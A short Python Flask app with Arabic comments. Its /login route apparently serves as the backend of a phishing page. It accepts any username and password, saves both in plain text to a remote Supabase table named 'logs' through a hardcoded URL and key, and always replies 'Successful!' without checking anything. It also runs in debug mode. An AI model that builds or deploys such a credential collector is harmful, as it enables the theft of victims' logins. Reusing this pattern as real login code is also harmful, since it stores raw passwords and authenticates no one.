from flask import Flask, render_template, request, redirect
from supabase import create_client, Client

app = Flask(__name__)

# إدخال بيانات Supabase الخاصة بكِ
SUPABASE_URL = "https://rajbbwtsaqmdniccozyb.supabase.co"
SUPABASE_KEY = "sb_publishable_9T4CB1rwWcEOEv4dRpvmRQ_9oM2IbMF"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # إدراج البيانات داخل جدول logs في Supabase
    try:
        supabase.table('logs').insert({
            'username': username, 
            'password': password
        }).execute()
    except Exception as e:
        print("Error inserting to Supabase:", e)

    return 'Successful!'

if __name__ == '__main__':
    app.run(debug=True)
